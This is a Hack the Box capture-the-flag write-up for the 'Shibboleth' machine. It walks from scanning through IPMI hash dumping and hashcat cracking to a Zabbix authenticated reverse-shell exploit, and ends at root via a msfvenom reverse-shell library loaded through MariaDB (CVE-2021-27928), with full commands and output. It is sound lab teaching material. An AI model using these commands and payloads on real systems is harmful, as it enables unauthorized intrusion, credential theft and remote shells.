post.title: Hack the Box Shibboleth Writeup

  }), "
    ")), mdx("h3", null, "Port Scanning"), mdx("p", null, "Using rustscan, I first found the open tcp ports very fast."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot Hackthebox/Shibboleth \xBB rustscan -a 10.10.11.124
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/malworm/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.11.124:80
")), mdx("p", null, "Only port 80 is open, which is default for http service. In ", mdx("inlineCode", {
    parentName: "p"
  }, "/etc/hosts"), ", add hostname for ", mdx("inlineCode", {
    parentName: "p"
  }, "10.10.11.124"), ". "), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "sudo nano /etc/hosts
Now add this: 10.10.11.124  shibboleth.htb
")), mdx("h3", null, "Service Scanning"), mdx("p", null, "Now lets visit the site and simultaneously run ", mdx("inlineCode", {
    parentName: "p"
  }, "nmap"), " on port 80 to find the http service details."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot Hackthebox/Shibboleth \xBB nmap -p 80 -sCV 10.10.11.124                                                                                                                     130 ↵
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 07:59 BST
Nmap scan report for 10.10.11.124
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb
")), mdx("p", null, "On visiting the webisite, nothing seems to strike that can be exploited. So I used ", mdx("inlineCode", {
    parentName: "p"
  }, "ffuf"), " to perform dir/file scan."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot Documents/Hackthebox \xBB ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u http://shibboleth.htb/FUZZ -fc 404 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 404
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 317, Words: 20, Lines: 10]
forms                   [Status: 301, Size: 316, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 59474, Words: 17014, Lines: 1324]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
")), mdx("p", null, "This too couldn't give me any useful information. So this left me with last option to perform subdomain fuzz,
For this too I used  ", mdx("inlineCode", {
    parentName: "p"
  }, "ffuf"), ". "), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot Security/HackTheBox \xBB ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://shibboleth.htb -H "Host:FUZZ.shibboleth.htb" -mc all -fc 400,404,302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.4.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 400,404,302
________________________________________________

monitor                 [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 110ms]
monitoring              [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 101ms]
zabbix                  [Status: 200, Size: 3689, Words: 192, Lines: 30, Duration: 105ms]
")), mdx("p", null, "Fortunately, this immediately gave me 3 subdomains!. Add these to /etc/hosts to open them on browse."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "10.10.11.124 monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb shibboleth.htb
")), mdx("p", null, "Now jump into the browser to explore these subdomains.
On opening them, I found that all three are actually the same, and it could also be realized earlier by seeing that
all three return same size and words. Anyway, what we have got is a Zabbix monitoring service. On searching for zabbix
on google, I found several vulnerabilities like cross-site scripting, zabbix_ID cookie exploit etc. in different versions
of the service.
But the problem was I couldn't find the version of zabbix this site was using to this led to nowhere.
After some waste attempts, UDP port struck me. It is common thing to overlook UDP ports sometimes."), mdx("h3", null, "UDP Port Scan"), mdx("p", null, "I used nmap to scan the UDP ports. It took long time to perform scan on all the ports, but I got something :)."), mdx("h3", null, "Exploiting IPMI"), mdx("p", null, "I searched for asf-rpmc service and luckily, third ", mdx("a", {
    parentName: "p",
    "href": "https://book.hacktricks.xyz/pentesting/623-udp-ipmi"
  }, "link"), " talked about IPMI service exploit.
", mdx("span", {
    parentName: "p",
    "className": "gatsby-resp-image-wrapper",
    "style": {
      "position": "relative",
      "display": "block",
      "marginLeft": "auto",
      "marginRight": "auto",
      "maxWidth": "960px"
    }
  }, "
      ", mdx("span", {
    parentName: "span",
    "className": "gatsby-resp-image-background-image",
    "style": {
      "paddingBottom": "88.33333333333333%",
      "position": "relative",
      "bottom": "0",
      "left": "0",
      "backgroundImage": "url('data:image/png;base64,')",
      "backgroundSize": "cover",
      "display": "block"
    }
  }), "
  ", mdx("img", {
    parentName: "span",
    "className": "gatsby-resp-image-image",
    "alt": "asf-rpmc",
    "title": "asf-rpmc",
    "src": "/blogs/static/957499170f601f94ee06ccaedbad03f7/7d769/asf-search.png",
    "srcSet": ["/blogs/static/957499170f601f94ee06ccaedbad03f7/5243c/asf-search.png 240w", "/blogs/static/957499170f601f94ee06ccaedbad03f7/ab158/asf-search.png 480w", "/blogs/static/957499170f601f94ee06ccaedbad03f7/7d769/asf-search.png 960w", "/blogs/static/957499170f601f94ee06ccaedbad03f7/e9794/asf-search.png 1009w"],
    "sizes": "(max-width: 960px) 100vw, 960px",
    "style": {
      "width": "100%",
      "height": "100%",
      "margin": "0",
      "verticalAlign": "middle",
      "position": "absolute",
      "top": "0",
      "left": "0"
    },
    "loading": "lazy",
    "decoding": "async"
  }), "
    ")), mdx("p", null, "using msfconsole, I found that the service was using Ciper-0 suite. I started with exploiting Ciper-0 but realized that
in the end I would require ssh servie which is not available on this machine.
So I looked on next link which exploited the service by grabbing hashes using ", mdx("inlineCode", {
    parentName: "p"
  }, "ipmi_dumphahes"), " module."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphahes
set RHOSTS 10.10.11.124
run
")), mdx("p", null, "Very quickly, I got the hash."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "[msf](Jobs:0 Agents:0) auxiliary(scanner/ipmi/ipmi_dumphashes) >> run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:724ed08782050000027e5803290ef23554d3f32eaea7b9ded33b5ec5c19dfe450860a449a90e24b8a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:141be421e0266850bed045aa16d590f731c5fdb0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

")), mdx("h3", null, "Cracking Hash"), mdx("p", null, "Next step is to crack the hash using ", mdx("inlineCode", {
    parentName: "p"
  }, "hashcat"), ". First I needed hash type code for using hashcat. On ", mdx("a", {
    parentName: "p",
    "href": "https://hashcat.net/wiki/doku.php?id=example_hashes"
  }, "this"), "
page search for ", mdx("em", {
    parentName: "p"
  }, "ipmi"), ", and we get the code - 7300"), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot HackTheBox/Shibboleth \xBB hashcat -m 7300 hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt                                                     130 ↵
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 13722/13786 MB (4096 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 67 MB

Dictionary cache built:
* Filename..: /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

724ed08782050000027e5803290ef23554d3f32eaea7b9ded33b5ec5c19dfe450860a449a90e24b8a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:141be421e0266850bed045aa16d590f731c5fdb0:ilovepumkinpie1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: IPMI2 RAKP HMAC-SHA1
Hash.Target......: 724ed08782050000027e5803290ef23554d3f32eaea7b9ded33...c5fdb0
Time.Started.....: Mon Apr  4 20:25:06 2022 (2 secs)
Time.Estimated...: Mon Apr  4 20:25:08 2022 (0 secs)
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3946.9 kH/s (1.56ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7397376/14344384 (51.57%)
Rejected.........: 0/7397376 (0.00%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: iloveyoo4lyfee987412800224656227599 -> ilovemymum55
")), mdx("p", null, "Yay we got the password for ", mdx("inlineCode", {
    parentName: "p"
  }, "Administrator"), " account!"), mdx("h3", null, "Post Authentication Exploit"), mdx("p", null, "After logging in, we get a very complex website, and no opening some links I couldn't make you much sense of it.
So I googled ", mdx("em", {
    parentName: "p"
  }, "zabbix post authentication exploit"), ", and ", mdx("a", {
    parentName: "p",
    "href": "https://www.exploit-db.com/exploits/50816"
  }, "first search result"), " gave me reverse-shell exploit for zabbix 5.0.17.
I confirmed that I was using the same version.
On running this exploit file, I got the shell. "), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot HackTheBox/Shibboleth \xBB python3 50816.py http://monitor.shibboleth.htb Administrator ilovepumkinpie1 10.10.14.13 8081                                   255 ↵
[*] this exploit is tested against Zabbix 5.0.17 only
[*] can reach the author @ https://hussienmisbah.github.io/
[+] the payload has been Uploaded Successfully
[+] you should find it at http://monitor.shibboleth.htb/items.php?form=update&hostid=10084&itemid=33618
[+] set the listener at 8081 please...
[?] note : it takes up to +1 min so be patient :)
[+] got a shell ? [y]es/[N]o: y
Nice !
")), mdx("p", null, "I used this command to upgrade my shell."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "python3 -c "import pty; pty.spawn('/bin/bash')" 
")), mdx("p", null, "I got shell as ", mdx("inlineCode", {
    parentName: "p"
  }, "zabbix"), " user. "), mdx("h3", null, "Owning The User"), mdx("p", null, "This phase was quite frustrating for me as I ran linpeas as spent few hours looking for some vulnerability until I found that
user ", mdx("inlineCode", {
    parentName: "p"
  }, "ipmi-svc"), " had the same password as zabbix."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "su ipmi-svc
cd
cat user.txt
")), mdx("p", null, "And I got the user flag!"), mdx("h3", null, "Owning The System"), mdx("p", null, "Earlier I found that system had mysql service running on port 3306 using MariaDB and also that the system had nmap installed. I ran it on localhost to find versions of mysql and mariadb."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "ipmi-svc@shibboleth:/tmp/malworm$ nmap -sCV 127.0.0.1
nmap -sCV 127.0.0.1
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-04 21:14 BST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
3306/tcp open  mysql   MySQL 5.5.5-10.3.25-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.25-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 430
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, SupportsTransactions, DontAllowDatabaseTableColumn, FoundRows, Support41Auth, LongColumnFlag, InteractiveClient, SupportsLoadDataLocal, ODBCClient, SupportsCompression, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: `Dp*{Rg0T:dh_#-Z]D{b
|_  Auth Plugin Name: mysql_native_password
")), mdx("p", null, "I also got the password for mysql database in linpeas output log."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "-rw-r----- 1 root ipmi-svc 21863 Apr 24  2021 /etc/zabbix/zabbix_server.conf
LogFile=/var/log/zabbix/zabbix_server.log
LogFileSize=0
PidFile=/run/zabbix/zabbix_server.pid
SocketDir=/run/zabbix
DBName=zabbix
DBUser=zabbix
DBPassword=bloooarskybluh
SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
Timeout=4
AlertScriptsPath=/usr/lib/zabbix/alertscripts
ExternalScripts=/usr/lib/zabbix/externalscripts
FpingLocation=/usr/bin/fping
Fping6Location=/usr/bin/fping6
LogSlowQueries=3000
StatsAllowedIP=127.0.0.1
")), mdx("p", null, "Using this I logged into mysql service but didn't find anything worth.
I searched for exploits of mysql 5.5.5 and tried some cve like ", mdx("inlineCode", {
    parentName: "p"
  }, "CVE-2016-6663"), " but they required mysql user to execute
the exploit. Then I searched for mariadb 10.3.25 exploit and found one easily ", mdx("a", {
    parentName: "p",
    "href": "https://github.com/Al1ex/CVE-2021-27928"
  }, "here"), ".
Then I generated the payload using msfvenom and I got the root shell!! "), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot HackTheBox/Shibboleth \xBB msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f elf-so -o cve-2021-27928.so                               1 ↵
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: cve-2021-27928.so
")), mdx("p", null, "I uploaded the .so file using python http server."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/rand2/cve-2021-27928.so";
SET GLOBAL wsrep_provider="/tmp/rand2/cve-2021-27928.so";
ERROR 2013 (HY000): Lost connection to MySQL server during query
")), mdx("p", null, "Started listener on my local machine on port 4444."), mdx("pre", null, mdx("code", {
    parentName: "pre"
  }, "malworm@parrot HackTheBox/Shibboleth \xBB nc -lnvp 4444        
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.124] 57820
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/var/lib/mysql
cd /root
cat root.txt
")), mdx("p", null, "And the machine is pwned :)) "));
}
;
MDXContent.isMDXComponent = true;
post.excerpt: Port Scanning Using rustscan, I first found the open tcp ports very fast. Only port 80 is open, which is default for http service. In  /etcâ€¦
